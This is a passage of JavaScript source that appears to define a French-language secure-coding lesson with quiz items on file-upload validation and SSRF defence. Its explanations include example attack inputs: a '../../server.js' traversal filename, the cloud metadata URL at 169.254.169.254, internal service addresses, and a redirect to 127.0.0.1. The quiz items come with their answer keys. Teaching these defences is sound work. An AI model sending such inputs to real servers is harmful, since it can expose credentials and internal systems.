          'import multer from "multer"\nimport { fileTypeFromBuffer } from "file-type"\n\nconst upload = multer({\n  storage: multer.memoryStorage(),\n  limits: { fileSize: 2 * 1024 * 1024, files: 1 }, // 2 Mo\n})\n\napp.post("/api/avatar", upload.single("photo"), async (req, res) => {\n  const type = await fileTypeFromBuffer(req.file.buffer)\n  if (!type || !["image/jpeg", "image/png", "image/webp"].includes(type.mime)) {\n    return res.status(400).json({ erreur: "Image JPEG, PNG ou WebP attendue" })\n  }\n  // ré-encoder, nommer avec un UUID, stocker hors du dossier public\n})',
        ),
        qcm(
          'Comment vérifier qu’un fichier téléversé est vraiment une image PNG ?',
          [
            'Regarder si le nom se termine par .png',
            'Lire l’en-tête Content-Type de la partie du formulaire',
            'Demander à l’utilisateur de confirmer',
            'Lire les premiers octets du fichier (sa signature)',
          ],
          3,
          'Le nom et le Content-Type sont fournis par le client. La signature au début du fichier reflète son contenu réel ; le ré-encodage reste la meilleure garantie.',
        ),
        vf(
          'Garder le nom d’origine du fichier téléversé est sans risque si on le stocke dans un dossier dédié.',
          false,
          'Un nom comme ../../server.js ou un nom déjà utilisé peut écraser des fichiers. Génère un identifiant toi-même et garde le nom d’origine en base, comme simple texte.',
        ),
        fill(
          'Limite la taille des fichiers acceptés par multer.',
          'const upload = multer({ limits: { ___: 2 * 1024 * 1024 } })',
          ['fileSize', 'maxSize', 'size', 'bytes'],
          'fileSize',
          'limits.fileSize est en octets : au-delà, multer rejette l’envoi avec une erreur LIMIT_FILE_SIZE.',
        ),
        tip(
          'SSRF : quand ton serveur fait la requête',
          'La falsification de requête côté serveur (SSRF) survient quand ton serveur télécharge une URL choisie par l’utilisateur : aperçu de lien, import d’image depuis une adresse, webhook configurable. L’attaquant donne une adresse interne que lui ne peut pas joindre, mais ton serveur si :\n• http://localhost:6379 ou un service d’administration interne ;\n• http://169.254.169.254/, le service de métadonnées des clouds, qui peut livrer des identifiants temporaires ;\n• une base ou un tableau de bord du réseau privé.\n\nDéfenses :\n• liste blanche de domaines quand c’est possible ;\n• sinon, résoudre le nom, refuser les adresses privées, de bouclage et de lien local (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1…), et se connecter à l’adresse vérifiée pour éviter un changement de DNS entre-temps ;\n• désactiver le suivi automatique des redirections, qui peuvent pointer vers une adresse interne ;\n• n’accepter que http et https, et limiter le temps et la taille de la réponse.\n\nCatégorie à part (A10) en 2021, la SSRF est rattachée au contrôle d’accès (A01) dans l’édition 2025.',
        ),
        qcm(
          'Ton service d’aperçu de liens reçoit http://169.254.169.254/latest/meta-data/. Que vise l’attaquant ?',
          [
            'Un simple déni de service',
            'Le service de métadonnées du cloud, qui peut livrer des identifiants',
            'Le site public de l’hébergeur',
            'La base OSV des vulnérabilités',
          ],
          1,
          'Cette adresse de lien local est le service de métadonnées de plusieurs clouds. Accessible depuis le serveur, il peut révéler des clés temporaires.',
        ),
        vf(
          'Pour se protéger de la SSRF, vérifier l’URL avant la requête puis laisser fetch suivre les redirections suffit.',
          false,
          'Un site externe autorisé peut répondre 302 vers http://127.0.0.1. Il faut désactiver ou revérifier chaque redirection.',
        ),
        match('Associe chaque risque à sa parade.', [
          ['Fichier énorme', 'limits.fileSize'],
          ['Faux type de fichier', 'Lire la signature, ré-encoder'],
          ['Nom ../../server.js', 'Nom généré par le serveur'],
          ['URL vers une adresse interne', 'Refuser les adresses privées'],
        ]),
        order(
          'Remets dans l’ordre le traitement sûr d’une photo de profil.',
          [
            'Refuser au-delà de 2 Mo',
            'Vérifier la signature du fichier',
            'Ré-encoder l’image et retirer les métadonnées',
            'Nommer le fichier avec un UUID',
            'Le stocker hors du dossier public',
          ],
          'Les contrôles les moins coûteux d’abord, puis la transformation, et enfin un stockage où le fichier ne pourra jamais être exécuté.',
        ),
      ]),
    ],
  ),
];
